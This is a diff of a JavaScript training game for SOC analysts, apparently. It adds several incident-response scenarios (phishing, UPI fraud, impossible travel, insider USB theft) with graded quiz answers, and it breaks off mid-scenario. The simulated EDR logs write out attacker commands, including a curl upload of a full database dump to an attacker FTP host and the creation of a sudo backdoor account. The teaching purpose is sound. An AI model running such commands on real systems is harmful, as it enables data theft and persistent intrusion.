@@ -451,60 +451,616 @@ const ATK_MSGS = [
 let lastMsgPct=0;
 
 // ── SCENARIO ──
-const S={
-  title:'Phishing Attack — Finance Workstation',
+
+// ── ALL 10 SCENARIOS ─────────────────────────────────────────────
+const ALL_SCENARIOS={
+
+// ─────────────────────────────────────────────────────────────────
+// 1. PHISHING ATTACK — India · Finance workstation
+// Based on: common spear phishing pattern targeting Indian corporates
+// ─────────────────────────────────────────────────────────────────
+"INC-2026-0441":{
+  title:"Phishing Attack — Finance Workstation",
+  subtitle:"Cobalt Strike C2 beacon via malicious invoice",
+  tag:"INDIA · TRUE POSITIVE",
   scenes:[
-    {id:'email',phase:'TRIAGE',phaseClass:'ph-t',xp:20,icon:'📧',
-     title:'Suspicious email in analyst inbox',
-     brief:'A finance analyst received this email 3 minutes ago. She has not opened it yet. Open the email, inspect the sender, read the headers. Then decide what to do.',
-     decision:{q:'You inspected the email carefully. What is your action?',opts:[
-       {t:'Report as phishing — spoofed domain, auth failures, macro attachment',c:true,w:'Correct. hdfc-bank-secure.net is not hdfc.com. Both DMARC and SPF fail — the domain is spoofed. The .docm macro attachment is the delivery mechanism. Report and block immediately.'},
-       {t:'Let it sit — wait to see if she opens it',c:false,w:'Wrong. Every minute a confirmed phishing email sits unblocked is a live threat. The SOC acts, not waits.'},
-       {t:'Forward to IT — not SOC responsibility',c:false,w:'Wrong. Phishing response is a core SOC function. Forwarding delays action and increases damage.'},
+    {id:"email",phase:"TRIAGE",phaseClass:"ph-t",xp:20,icon:"📧",
+     title:"Suspicious email in finance analyst inbox",
+     brief:"Analyst priya.sharma@corp.in received this email 3 minutes ago. She has not opened it yet. Inspect the sender, headers, and attachment before she does.",
+     decision:{q:"You inspected the email carefully. What is your action?",opts:[
+       {t:"Report as phishing — spoofed domain, auth failures, macro attachment",c:true,w:"Correct. hdfc-bank-secure.net is not hdfc.com. DMARC and SPF both fail. The .docm macro is the delivery mechanism. Report and block immediately."},
+       {t:"Let it sit — wait to see if she opens it",c:false,w:"Wrong. Every minute a confirmed phishing email sits unblocked is a live threat. SOC acts, not waits."},
+       {t:"Forward to IT — not SOC responsibility",c:false,w:"Wrong. Phishing response is a core SOC function."},
      ]}},
-    {id:'siem',phase:'TRIAGE',phaseClass:'ph-t',xp:20,icon:'🚨',
-     title:'SIEM fired — 4 alerts on same host',
-     brief:'She opened the attachment before you blocked it. BlueTrace SIEM fired 4 alerts immediately. Read each one. Click the most dangerous alert to investigate it.',
-     decision:{q:'You read the C2 beacon alert. Risk score 97/100. Two correlated rules on the same host at 08:17. Your classification?',opts:[
-       {t:'TRUE POSITIVE — Open incident and investigate immediately',c:true,w:'Correct. Risk score 97/100 with two correlated critical rules (C2 beacon + LSASS access) on one host = confirmed True Positive. Open the incident.'},
-       {t:'FALSE POSITIVE — Probably an endpoint scanner',c:false,w:'Wrong. A 97/100 score with two correlated rules is not a scanner. C2 beacon + credential theft together = active attacker in progress.'},
-       {t:'Escalate to senior — not sure',c:false,w:'Wrong. You have a 97/100 risk score with two correlated rules. That is sufficient to classify as True Positive. Act.'},
+    {id:"siem",phase:"TRIAGE",phaseClass:"ph-t",xp:20,icon:"🚨",
+     title:"SIEM fired — 4 critical alerts",
+     brief:"She opened the attachment before you blocked it. SIEM fired 4 alerts. Read each one. Click the most dangerous to investigate.",
+     decision:{q:"C2 beacon alert: risk score 97/100, two correlated rules on same host at 08:17. Your classification?",opts:[
+       {t:"TRUE POSITIVE — Open incident and investigate immediately",c:true,w:"Correct. 97/100 with C2 beacon + LSASS access on one host = confirmed True Positive."},
+       {t:"FALSE POSITIVE — Probably an endpoint scanner",c:false,w:"Wrong. Two correlated rules at 97/100 is not a scanner. Act immediately."},
+       {t:"Escalate to senior — not sure",c:false,w:"Wrong. 97/100 with two correlated rules is sufficient to classify."},
      ]}},
-    {id:'edr',phase:'INVESTIGATION',phaseClass:'ph-i',xp:25,icon:'🖥',
-     title:'Trace the kill chain in EDR',
-     brief:'Open the process tree on WS-CORP-FIN-044. Click each process to expand it. Trace how the attacker got in. Find svchost32.exe and run a hash lookup to confirm.',
-     decision:{q:'Hash lookup confirms: 97/100 malicious, Cobalt Strike. Chain: OUTLOOK→WINWORD→cmd→powershell→svchost32. What does this mean?',opts:[
-       {t:'Phishing email with macro delivered a Cobalt Strike C2 implant',c:true,w:'Correct. OUTLOOK→WINWORD = email attachment opened. cmd.exe/powershell = macro executing shell commands. svchost32.exe = Cobalt Strike beacon — the C2 implant dropped by the macro.'},
-       {t:'Remote exploit against a vulnerability in Microsoft Office',c:false,w:'Wrong. A remote exploit would not originate from OUTLOOK.EXE. The chain starts at email, meaning an attachment triggered WINWORD. This is macro execution.'},
-       {t:'User deliberately installed the software',c:false,w:'Wrong. The process chain is entirely automated — macro execution from an email attachment. The user just opened an email.'},
+    {id:"edr",phase:"INVESTIGATION",phaseClass:"ph-i",xp:25,icon:"🖥",
+     title:"Trace the kill chain in EDR",
+     brief:"Open the process tree on WS-CORP-FIN-044. Click each process. Find svchost32.exe and hash it.",
+     decision:{q:"Hash: 97/100 malicious, Cobalt Strike. Chain: OUTLOOK→WINWORD→cmd→powershell→svchost32. What does this mean?",opts:[
+       {t:"Phishing email with macro delivered a Cobalt Strike C2 implant",c:true,w:"Correct. OUTLOOK→WINWORD = email attachment. cmd/powershell = macro execution. svchost32.exe = Cobalt Strike beacon dropped by the macro."},
+       {t:"Remote exploit against Microsoft Office vulnerability",c:false,w:"Wrong. The chain starts at OUTLOOK — email attachment triggered it. This is macro execution."},
+       {t:"User deliberately installed the software",c:false,w:"Wrong. Fully automated macro chain from an email attachment."},
      ]}},
-    {id:'network',phase:'CONTAINMENT',phaseClass:'ph-c',xp:25,icon:'📡',
-     title:'Active C2 connection — act right now',
-     brief:'svchost32.exe is beaconing to the attacker every 30 seconds. The connection is live. Every beacon that fires sends more data to the attacker. Choose your action.',
-     decision:{q:'The machine is beaconing. Attacker is receiving live data. What do you do?',opts:[
-       {t:'Network isolate — cut all external connections, keep on LAN for forensics',c:true,w:'Best action. Network isolation severs the C2 channel immediately while keeping the machine on your internal network for forensic investigation. Shutdown destroys volatile memory evidence.'},
-       {t:'Block the C2 IP at the firewall only',c:false,w:'Insufficient. The attacker can rotate to a backup C2 server within seconds. Firewall block alone does not stop the implant. Isolate the endpoint entirely.'},
-       {t:'Keep monitoring — collect more evidence',c:false,w:'Wrong. Every 30 seconds more data is exfiltrated. On a confirmed C2 beacon, you isolate immediately. Evidence collection does not justify continued attacker access.'},
+    {id:"network",phase:"CONTAINMENT",phaseClass:"ph-c",xp:25,icon:"📡",
+     title:"Active C2 connection — act now",
+     brief:"svchost32.exe is beaconing to 203.0.113.47 every 30 seconds. Live right now. Choose your action.",
+     decision:{q:"Machine is beaconing. Every 30 seconds more data goes to the attacker. What do you do?",opts:[
+       {t:"Network isolate — cut all external connections, keep on LAN for forensics",c:true,w:"Best action. Isolation severs C2 immediately while preserving the machine for forensics."},
+       {t:"Block the C2 IP at the firewall only",c:false,w:"Insufficient. Attacker can pivot to backup C2 in seconds. Isolate the endpoint entirely."},
+       {t:"Keep monitoring — collect more evidence",c:false,w:"Wrong. Every 30 seconds more credentials are exfiltrated. Isolate immediately."},
      ]}},
-    {id:'quarantine',phase:'CONTAINMENT',phaseClass:'ph-c',xp:20,icon:'🗂',
-     title:'Find and quarantine the malware',
-     brief:'Machine is isolated. Now find the malicious files in the Downloads folder. Select each suspicious file, check its details, and quarantine it.',
-     decision:{q:'Both files quarantined. What three defensive improvements prevent this next time?',opts:[
-       {t:'EDR prevention mode ON + block Office macros + block .docm at email gateway',c:true,w:'Correct. Three gaps: EDR should have blocked powershell execution, macro execution should be blocked by policy, and .docm attachments should never reach end users via email.'},
-       {t:'Change the user\'s password — that is sufficient',c:false,w:'Necessary but insufficient. Credentials were already dumped. The three technical control gaps need fixing or the next phishing attempt succeeds the same way.'},
-       {t:'Reinstall Windows on the affected machine',c:false,w:'Overkill. Quarantine and eradication is sufficient if done correctly. The real fix is the three policy gaps.'},
+    {id:"quarantine",phase:"CONTAINMENT",phaseClass:"ph-c",xp:20,icon:"🗂",
+     title:"Find and quarantine the malware",
+     brief:"Machine isolated. Find and quarantine the two malicious files in Downloads.",
+     decision:{q:"Both files quarantined. What three changes prevent this next time?",opts:[
+       {t:"EDR prevention mode ON + block Office macros + block .docm at email gateway",c:true,w:"Correct. EDR should block powershell execution, macros should be disabled by policy, and .docm files should never reach users."},
+       {t:"Change the user password — that is sufficient",c:false,w:"Necessary but insufficient. Three technical control gaps need fixing."},
+       {t:"Reinstall Windows on the machine",c:false,w:"Overkill. Quarantine and eradication is sufficient. Fix the policy gaps."},
      ]}},
-    {id:'report',phase:'CLOSE',phaseClass:'ph-cl',xp:20,icon:'📋',
-     title:'Write the incident report',
-     brief:'Incident contained. Now document it properly. A good report tells you what happened AND why the controls failed — so it does not happen again.',
-     decision:{q:'What is the ROOT CAUSE of this incident — why did technical controls fail to stop it?',opts:[
-       {t:'EDR was in detect-only mode — prevention policy was not enforced',c:true,w:'Correct. If EDR was in PREVENT mode, powershell.exe dropping svchost32.exe would have been automatically blocked before it ran. This single operational gap is the root cause.'},
-       {t:'The user opened a phishing email — user error',c:false,w:'That is the attack vector. Root cause is WHY the technical controls failed AFTER the user made a mistake. Users will always make mistakes — controls must catch them.'},
-       {t:'Antivirus did not detect the malware',c:false,w:'Too vague. The specific failure: EDR prevention policy was disabled. Name the exact gap, not a generic technology statement.'},
+    {id:"report",phase:"CLOSE",phaseClass:"ph-cl",xp:20,icon:"📋",
+     title:"Write the incident report",
+     brief:"Document what happened AND why the controls failed.",
+     decision:{q:"What is the ROOT CAUSE — why did technical controls fail?",opts:[
+       {t:"EDR was in detect-only mode — prevention policy was not enforced",c:true,w:"Correct. If EDR was in PREVENT mode, powershell.exe dropping svchost32.exe would have been blocked automatically."},
+       {t:"The user opened a phishing email — user error",c:false,w:"That is the attack vector. Root cause is WHY controls failed AFTER the user made a mistake."},
+       {t:"Antivirus did not detect the malware",c:false,w:"Too vague. The specific failure: EDR prevention policy was disabled."},
      ]}},
   ]
-};
+},
 
+// ─────────────────────────────────────────────────────────────────
+// 2. UPI PAYMENT FRAUD — India · Dating app scam
+// Based on: real news — ₹7 lakh stolen via dating app romance scam
+// All details fictional. Companies/people invented.
+// ─────────────────────────────────────────────────────────────────
+"INC-2026-0544":{
+  title:"UPI Fraud — Dating App Romance Scam",
+  subtitle:"₹7.2 lakh stolen via social engineering + UPI manipulation",
+  tag:"INDIA · TRUE POSITIVE",
+  scenes:[
+    {id:"email",phase:"TRIAGE",phaseClass:"ph-t",xp:20,icon:"💸",
+     title:"Fraud alert: ₹7.2 lakh transferred — customer complaint",
+     brief:"A customer (Arjun Mehta, Mumbai) filed a complaint. He met someone on a dating app. They asked him to invest in a 'crypto trading app'. He transferred ₹7.2 lakh over 3 transactions in 2 hours. Read the fraud report.",
+     emailData:{
+       from:"fraud-alerts@upi-monitor.corp.in",
+       subject:"FRAUD ALERT: ₹7,20,000 — Possible romance scam — INC-2026-0544",
+       body:`Customer: Arjun Mehta (Mumbai, 34)
+Account: HDFC XXXX-7821
+Amount: ₹7,20,000 — 3 UPI transactions
+Time: 14:32 — 16:44 IST today
+Recipient: priya.investment2026@okaxis (NEW account, 3 days old)
+
+Customer statement: Met "Priya Singh" on TrueMeet dating app 
+2 weeks ago. She claimed to work for a Singapore hedge fund.
+Showed him fake profit screenshots. Asked him to install 
+"TradePro Global" app and deposit funds.
+
+Customer transferred:
+₹1,50,000 at 14:32 — "initial investment"
+₹2,70,000 at 15:18 — "to unlock higher returns"  
+₹3,00,000 at 16:44 — "urgent — position closing"
+
+App is now showing "verification pending". 
+Customer cannot withdraw. Contact lost.`,
+       iocs:[
+         "Recipient UPI ID registered 3 days ago — new mule account",
+         "3 large transfers in 2 hours — unusual velocity",
+         "Third-party app install requested by unknown contact",
+         "Urgency pressure tactics — classic social engineering",
+         "Fake profit screenshots used as bait"
+       ]
+     },
+     decision:{q:"You reviewed the fraud report. What is your immediate action?",opts:[
+       {t:"Freeze the destination UPI ID and escalate to cyber crime cell",c:true,w:"Correct. Freeze the mule account (priya.investment2026@okaxis) immediately — funds may still be there. Escalate to cyber crime. Document everything for the FIR."},
+       {t:"Wait for more transactions — gather more evidence first",c:false,w:"Wrong. Funds are moving now. Every minute of delay reduces recovery chances. Freeze first."},
+       {t:"Tell the customer it is his fault — he authorized the transfers",c:false,w:"Wrong. Even authorized transfers can be fraud. The bank has a duty to investigate and assist with recovery."},
+     ]}},
+    {id:"siem",phase:"INVESTIGATION",phaseClass:"ph-i",xp:20,icon:"🔍",
+     title:"Trace the money — follow the UPI trail",
+     brief:"Pull the transaction logs. The ₹7.2 lakh went to priya.investment2026@okaxis. Check where it went next. Three hops in 90 minutes.",
+     siemData:{alerts:[
+       {id:"TXN-001",sev:"CRITICAL",time:"14:32:18",rule:"LARGE_TRANSFER_NEW_PAYEE",msg:"₹1,50,000 to priya.investment2026@okaxis — new payee, first-ever transfer",key:true,
+        det:{"Amount":"₹1,50,000","Recipient":"priya.investment2026@okaxis","Account age":"3 days","Risk Score":"91/100","Flag":"First transfer to this payee"}},
+       {id:"TXN-002",sev:"CRITICAL",time:"15:18:44",rule:"VELOCITY_BREACH",msg:"₹2,70,000 — second large transfer in 46 minutes to same account",
+        det:{"Amount":"₹2,70,000","Total so far":"₹4,20,000","Time gap":"46 minutes","Risk Score":"96/100","Flag":"Velocity breach — multiple large transfers"}},
+       {id:"TXN-003",sev:"CRITICAL",time:"16:44:02",rule:"MULE_ACCOUNT_PATTERN",msg:"₹3,00,000 — recipient account forwarded all funds to 4 other accounts within 8 minutes",
+        det:{"Amount":"₹3,00,000","Forwarded to":"4 accounts (fund splitting pattern)","Time to forward":"8 minutes","Risk Score":"99/100","Flag":"Classic mule layering pattern"}},
+       {id:"TXN-004",sev:"HIGH",time:"16:52:10",rule:"CROSS_BANK_LAYERING",msg:"Funds split across Paytm, PhonePe, and Kotak accounts — layering",
+        det:{"Pattern":"Split to 4 mule accounts","Banks":"HDFC → Paytm/PhonePe/Kotak/Airtel","Purpose":"Layering to obscure origin","Verdict":"Classic money laundering pattern"}},
+     ]},
+     decision:{q:"Funds were split to 4 mule accounts 8 minutes after receiving. What does this pattern indicate?",opts:[
+       {t:"Organised fraud ring — mule network used to layer and launder money",c:true,w:"Correct. The 8-minute forwarding and splitting to 4 accounts is a classic organised fraud layering pattern. This is not a lone actor."},
+       {t:"Customer sent money to family members for safety",c:false,w:"Wrong. Splitting to 4 new accounts in 8 minutes after receiving a fraud transfer is a clear mule network pattern."},
+       {t:"Bank error — duplicate transaction processing",c:false,w:"Wrong. The forwarding is deliberate and rapid — hallmark of a professional mule operation."},
+     ]}},
+    {id:"edr",phase:"INVESTIGATION",phaseClass:"ph-i",xp:25,icon:"📱",
+     title:"Analyse the fake trading app",
+     brief:"The customer installed 'TradePro Global' APK from a link sent on WhatsApp. Analyse it. Check permissions and network traffic.",
+     procData:{host:"Customer Phone (Android 13)",procs:[
+       {n:"TradePro Global v1.2",pid:8821,d:0,s:"malicious",info:{"Package":"com.tradepro.global.invest","Install source":"WhatsApp link (not Play Store)","Permissions":"READ_SMS, CONTACTS, LOCATION, CAMERA, MICROPHONE","Verdict":"Malware — credential harvesting + screen capture"}},
+       {n:"SMS Reader Service",pid:8822,d:1,s:"malicious",info:{"Parent":"TradePro Global","Purpose":"Reads all incoming OTPs and SMS","Risk":"Bank OTPs being intercepted in real time","Verdict":"OTP stealer — active"}},
+       {n:"Screen Capture Module",pid:8823,d:1,s:"malicious",info:{"Parent":"TradePro Global","Purpose":"Screenshots every 30 seconds","Uploads to":"185.220.101.47 (threat actor C2)","Verdict":"Spyware — banking credentials exposed"}},
+       {n:"Fake Balance Display",pid:8824,d:1,s:"suspicious",info:{"Purpose":"Shows fake profit balance to victim","Balance shown":"₹42,80,000 (fake)","Withdrawal":"Blocked — 'verification pending'","Verdict":"Social engineering mechanism"}},
+     ],hashTarget:{hash:"APK:a3f2b9d1e4c8f0a7",score:98,family:"Android.FraudKit.TradePro",detections:"61/68 mobile AV engines",c2:"185.220.101.47"}},
+     decision:{q:"TradePro Global is reading all SMS and capturing screens. What is the immediate action for the customer?",opts:[
+       {t:"Uninstall the app immediately, change all banking PINs/passwords, report to cyber crime",c:true,w:"Correct. The app is reading OTPs and capturing screens. Uninstall first, then change every banking credential before the attacker uses the intercepted OTPs."},
+       {t:"Keep the app — it might still recover the funds",c:false,w:"Wrong. The app is malware. Every second it runs, more credentials and OTPs are being stolen."},
+       {t:"Screenshot the app as evidence before uninstalling",c:false,w:"Wrong order. Uninstall immediately to stop ongoing theft. Forensic evidence can be collected after the threat is neutralised."},
+     ]}},
+    {id:"network",phase:"CONTAINMENT",phaseClass:"ph-c",xp:20,icon:"🚔",
+     title:"File cyber crime report — evidence package",
+     brief:"Freeze the mule accounts. File the cyber crime complaint. Time matters — banks can reverse transactions within 24 hours if reported quickly.",
+     connData:{src:"Arjun Mehta → priya.investment2026@okaxis",dst:"4 mule accounts across banks",status:"PARTIALLY RECOVERABLE — funds still in 2 of 4 accounts"},
+     decision:{q:"2 of 4 mule accounts still have funds. Bank can request reversal. What do you include in the cyber crime complaint?",opts:[
+       {t:"All 3 UPI transaction IDs, recipient UPI IDs, WhatsApp number, APK file, full timeline",c:true,w:"Correct. All transaction IDs + recipient UPI IDs allow banks to freeze accounts. WhatsApp number + APK help police trace the operator. Full timeline shows fraud pattern."},
+       {t:"Just the transaction IDs — that is enough for the bank",c:false,w:"Wrong. Transaction IDs alone get the bank to reverse. But the WhatsApp number and APK are critical for police to trace and arrest the fraud ring."},
+       {t:"Wait for police to collect evidence themselves",c:false,w:"Wrong. In cyber fraud, time is critical. Banks have reversal windows. Customer must proactively provide all evidence immediately."},
+     ]}},
+    {id:"report",phase:"CLOSE",phaseClass:"ph-cl",xp:15,icon:"📋",
+     title:"Incident report — cyber fraud",
+     brief:"Document the fraud pattern, recovery status, and preventive controls.",
+     reportData:{"Incident ID":"INC-2026-0544","Type":"UPI Payment Fraud — Romance Scam","Amount Lost":"₹7,20,000","Recovered":"₹1,80,000 (2 of 4 mule accounts frozen)","Attack Vector":"Dating app + fake trading app + social engineering","Malware":"Android.FraudKit.TradePro","C2 Server":"185.220.101.47","Status":"PARTIAL RECOVERY — FIR filed"},
+     decision:{q:"Root cause: why did the customer fall for this and how does the bank prevent it?",opts:[
+       {t:"No real-time large transfer alert to customer + no block on sideloaded APK OTP interception",c:true,w:"Correct. Two gaps: bank should have called the customer on the 3rd large transfer to an unknown new account. And banking apps should detect if an OTP-reading app is installed."},
+       {t:"Customer was greedy — nothing the bank can do",c:false,w:"Wrong. Social engineering exploits human psychology that affects anyone. Banks have technical controls that can catch these patterns."},
+       {t:"UPI should be shut down — it is too risky",c:false,w:"Wrong. UPI is critical infrastructure. The issue is specific fraud controls, not the payment system itself."},
+     ]}},
+  ]
+},
+
+// ─────────────────────────────────────────────────────────────────
+// 3. IMPOSSIBLE TRAVEL — Industry Standard
+// ─────────────────────────────────────────────────────────────────
+"INC-2026-0521":{
+  title:"Impossible Travel — Account Takeover",
+  subtitle:"Same account logged in from Mumbai and London 4 minutes apart",
+  tag:"INDUSTRY STANDARD · TRUE POSITIVE",
+  scenes:[
+    {id:"siem",phase:"TRIAGE",phaseClass:"ph-t",xp:20,icon:"🌍",
+     title:"Impossible travel alert — same account, two cities",
+     brief:"Azure AD fired an impossible travel alert. Same account logged in from two cities 4 minutes apart. Read the alert details.",
+     siemData:{alerts:[
+       {id:"AAD-441",sev:"CRITICAL",time:"02:17:04",rule:"IMPOSSIBLE_TRAVEL",msg:"rahul.verma@corp.in — login from Mumbai then London 4 min later. Impossible.",key:true,
+        det:{"Account":"rahul.verma@corp.in","Login 1":"Mumbai, India · 02:17 IST · IP: 103.21.58.91","Login 2":"London, UK · 02:21 IST · IP: 185.220.101.3","Time gap":"4 minutes","Distance":"7,200 km","Risk Score":"99/100","Admin access":"Yes — 3 servers"}},
+       {id:"AAD-442",sev:"HIGH",time:"02:22:11",rule:"ADMIN_ACCESS_OFFHOURS",msg:"rahul.verma accessed PROD-DB-01, PROD-APP-02 at 02:22 — off hours",
+        det:{"Resources":"PROD-DB-01, PROD-APP-02, FILESERVER-03","Time":"02:22 IST — 2AM","Normal hours":"09:00–19:00 IST","Verdict":"Admin accessing production at 2AM from London IP"}},
+     ]},
+     decision:{q:"Same account, Mumbai at 02:17 then London at 02:21. 4 minutes, 7200 km. What is this?",opts:[
+       {t:"Account takeover — attacker in London using stolen credentials",c:true,w:"Correct. 7200 km in 4 minutes is physically impossible. The London login is an attacker using stolen credentials. The Mumbai login may be the real user or also the attacker using a VPN."},
+       {t:"VPN issue — user probably enabled a VPN in the office",c:false,w:"Possible but unlikely at 2AM with admin access to production servers. The risk is too high to assume VPN. Treat as compromise and verify."},
+       {t:"False positive — Azure AD makes mistakes",c:false,w:"Wrong. Impossible travel with admin access at 2AM to production servers is a confirmed high-risk event. Act."},
+     ]}},
+    {id:"edr",phase:"INVESTIGATION",phaseClass:"ph-i",xp:25,icon:"🔐",
+     title:"Check what the London IP accessed",
+     brief:"The London IP logged into PROD-DB-01 at 02:22. Check the access logs. What did they do in 8 minutes?",
+     procData:{host:"PROD-DB-01 (Production Database)",procs:[
+       {n:"mysqldump",pid:3301,d:0,s:"malicious",info:{"Executed by":"rahul.verma (London IP)","Command":"mysqldump --all-databases > /tmp/full_backup.sql","Time":"02:22:44","Size":"4.2 GB dump","Verdict":"Full database exfiltration attempt"}},
+       {n:"curl",pid:3302,d:1,s:"malicious",info:{"Parent":"shell session","Command":"curl -T /tmp/full_backup.sql ftp://185.220.101.3/uploads/","Destination":"185.220.101.3 (same as attacker IP)","Transfer":"4.2 GB — exfiltrated","Verdict":"Database sent to attacker server"}},
+       {n:"useradd",pid:3303,d:1,s:"malicious",info:{"Command":"useradd -m -s /bin/bash -G sudo backup_svc","Purpose":"Creating backdoor admin account","Verdict":"Persistence mechanism — backdoor user created"}},
+     ],hashTarget:{hash:"185.220.101.3",score:97,family:"Known APT infrastructure — Eastern Europe",detections:"Threat intel: 47 fraud campaigns",c2:"185.220.101.3"}},
+     decision:{q:"In 8 minutes: full DB dumped (4.2 GB), sent to attacker server, backdoor admin account created. Priority?",opts:[
+       {t:"Disable rahul.verma account + delete backdoor user + block 185.220.101.3 immediately",c:true,w:"Correct. Three actions in order: disable the compromised account to stop active access, delete the backdoor user (backup_svc) to remove persistence, block the C2 IP."},
+       {t:"Wait and monitor — see if they do more",c:false,w:"Wrong. 4.2 GB already exfiltrated. A backdoor account already created. Every second of monitoring is another second of potential damage."},
+       {t:"Disable the database — take it offline",c:false,w:"Wrong priority. This is production. Disable the account first, then assess if DB needs to go offline. Don't cause availability incident unnecessarily."},
+     ]}},
+    {id:"network",phase:"CONTAINMENT",phaseClass:"ph-c",xp:25,icon:"🔒",
+     title:"Contain — disable account, block IP, kill backdoor",
+     brief:"Execute containment. Disable the account, remove the backdoor, block the C2 IP, and notify the real rahul.verma.",
+     connData:{src:"rahul.verma@corp.in (London IP: 185.220.101.3)",dst:"PROD-DB-01, PROD-APP-02, FILESERVER-03",status:"ACTIVE — attacker still has session"},
+     decision:{q:"Rahul.verma says he was asleep at 2AM and never logged in. Credentials were stolen. How were they stolen?",opts:[
+       {t:"Likely phishing email that captured credentials + no MFA enabled on his account",c:true,w:"Correct. No MFA is the critical gap. Even with stolen credentials, an attacker cannot log in if MFA is enforced. This is the root cause."},
+       {t:"Rahul used a weak password",c:false,w:"Password strength is a factor but not the root cause. Credentials can be phished regardless of strength. MFA would have stopped this even with a strong password stolen."},
+       {t:"The database had a vulnerability",c:false,w:"Wrong. The attacker used valid credentials. The database was not exploited — it was legitimately accessed with stolen admin creds."},
+     ]}},
+    {id:"report",phase:"CLOSE",phaseClass:"ph-cl",xp:20,icon:"📋",
+     title:"Incident report — account takeover",
+     brief:"Document what was exfiltrated, what was changed, and what must happen next.",
+     reportData:{"Incident ID":"INC-2026-0521","Type":"Account Takeover — Impossible Travel","Account":"rahul.verma@corp.in","Data Exfiltrated":"4.2 GB full database dump","Backdoor Created":"backup_svc (sudo) — DELETED","Attacker IP":"185.220.101.3 (blocked)","Status":"CONTAINED — MFA enforcement pending"},
+     decision:{q:"4.2 GB database was exfiltrated. It contains customer PII. What are your obligations?",opts:[
+       {t:"Notify affected customers + file CERT-In report within 6 hours + engage legal team",c:true,w:"Correct. Under CERT-In rules, a breach must be reported within 6 hours of discovery. Customer PII exposure requires notification. Legal team must assess DPDPA obligations."},
+       {t:"Keep it internal — no need to notify anyone",c:false,w:"Wrong. CERT-In mandatory reporting applies. Failure to report is itself a violation with penalties."},
+       {t:"Only notify if customers complain",c:false,w:"Wrong. Proactive notification is legally required under DPDPA 2023 and CERT-In guidelines, regardless of whether customers notice."},
+     ]}},
+  ]
+},
+
+// ─────────────────────────────────────────────────────────────────
+// 4. INSIDER THREAT — Industry Standard
+// USB exfiltration by departing employee
+// ─────────────────────────────────────────────────────────────────
+"INC-2026-0561":{
+  title:"Insider Threat — USB Exfiltration",
+  subtitle:"Departing employee copies 2.1 GB to USB at 11PM",
+  tag:"INDUSTRY STANDARD · TRUE POSITIVE",
+  scenes:[
+    {id:"siem",phase:"TRIAGE",phaseClass:"ph-t",xp:20,icon:"🔌",
+     title:"USB device inserted — large data transfer at 11PM",
+     brief:"DLP alert fired. An employee inserted a USB drive and copied 2.1 GB in 12 minutes. At 11PM. Read the alert.",
+     siemData:{alerts:[
+       {id:"DLP-881",sev:"CRITICAL",time:"23:04:18",rule:"USB_MASS_STORAGE_LARGE_TRANSFER",msg:"ankit.joshi copied 2.1 GB to USB at 23:04 — includes flagged keyword files",key:true,
+        det:{"User":"ankit.joshi@corp.in","Device":"WS-DEV-ANKIT-03","USB ID":"Kingston DataTraveler 3.0","Data Copied":"2.1 GB in 12 minutes","File types":"Source code (.py, .js), Config files (.env, .yaml), Customer data (.csv)","Keywords flagged":"API_KEY, DATABASE_URL, customer_email","Risk":"HR flag: resigned, last day is tomorrow"}},
+       {id:"DLP-882",sev:"HIGH",time:"23:04:22",rule:"SOURCE_CODE_EXFILTRATION",msg:"312 source code files copied — includes production config with live API keys",
+        det:{"Files":"312 .py, .js, .yaml files","Includes":"production.env (live database credentials + API keys)","Risk":"Complete production credentials copied to unencrypted USB"}},
+     ]},
+     decision:{q:"Departing employee, last day tomorrow, copying source code and production credentials to USB at 11PM. What is this?",opts:[
+       {t:"True Positive insider threat — data theft by departing employee",c:true,w:"Correct. Timing (last day tomorrow), volume (2.1 GB), content (source code + production credentials), and off-hours (11PM) all confirm insider data theft."},
+       {t:"False positive — employee probably taking personal files",c:false,w:"Wrong. Source code, production .env files with API keys, and customer CSV files are not personal. This is corporate IP and sensitive data."},
+       {t:"Wait until morning to confirm with HR",c:false,w:"Wrong. The transfer is happening now. The USB is being taken off-premise tonight. Act now."},
+     ]}},
+    {id:"edr",phase:"INVESTIGATION",phaseClass:"ph-i",xp:20,icon:"📂",
+     title:"Check exactly what was copied",
+     brief:"Open DLP logs. See every file that was transferred to the USB. Confirm whether production credentials were included.",
+     procData:{host:"WS-DEV-ANKIT-03",procs:[
+       {n:"File copy operation",pid:5501,d:0,s:"malicious",info:{"Operation":"xcopy /S /E D:\repos\ H:\","Source":"D:\repos\ (entire codebase)","Destination":"H:\ (USB drive)","Files copied":"312 source files","Time":"23:04:18"}},
+       {n:"production.env",pid:5502,d:1,s:"malicious",info:{"File":"D:\repos\api-server\production.env","Contains":"DB_URL, STRIPE_SECRET_KEY, SENDGRID_API_KEY, JWT_SECRET","Risk":"Complete production compromise possible","Verdict":"Live production credentials — must rotate immediately"}},
+       {n:"customers_export.csv",pid:5503,d:1,s:"malicious",info:{"File":"D:\reports\customers_export.csv","Contains":"14,832 customer records — name, email, phone, address","Risk":"PII data breach","Verdict":"Customer PII on unencrypted USB"}},
+       {n:"git_history.tar",pid:5504,d:1,s:"suspicious",info:{"File":"D:\repos\git_history.tar","Contains":"Full git history including old credentials","Risk":"Historical credentials may be reused"}},
+     ],hashTarget:{hash:"USB:Kingston-DT3.0-SN447821",score:95,family:"Confirmed exfiltration device",detections:"2.1 GB transferred to unencrypted USB",c2:"Physical device — off-premise risk"}},
+     decision:{q:"production.env with live Stripe, DB, and JWT credentials was copied. What must happen in the next 10 minutes?",opts:[
+       {t:"Rotate ALL production credentials immediately — DB password, Stripe key, Sendgrid key, JWT secret",c:true,w:"Correct. The credentials are on an unencrypted USB leaving the building. Assume compromised. Rotate all of them now. Database first — that protects customer data."},
+       {t:"Wait to speak to Ankit first — maybe it was accidental",c:false,w:"Wrong. Whether accidental or not, production credentials on an unencrypted USB leaving the building are compromised. Rotate immediately, ask questions after."},
+       {t:"Just revoke his access — credentials are safe",c:false,w:"Wrong. Revoking access does not help — he has the credentials on a physical USB. They must be rotated."},
+     ]}},
+    {id:"network",phase:"CONTAINMENT",phaseClass:"ph-c",xp:25,icon:"🛑",
+     title:"Contain — revoke access, rotate credentials, legal hold",
+     brief:"Revoke all access immediately. Rotate credentials. Put a legal hold on the USB. Coordinate with HR and Legal.",
+     connData:{src:"ankit.joshi@corp.in",dst:"USB Device + possibly personal cloud",status:"USB TAKEN OFF-PREMISE — credentials at risk"},
+     decision:{q:"Ankit denies wrongdoing. He says it was his personal backup. HR wants to let him go quietly. What do you recommend?",opts:[
+       {t:"Preserve all evidence, coordinate with legal, file internal report — do not let him destroy the USB",c:true,w:"Correct. Whether or not charges are filed, the company must preserve evidence, rotate credentials, and document the incident. Allowing destruction of evidence creates legal liability."},
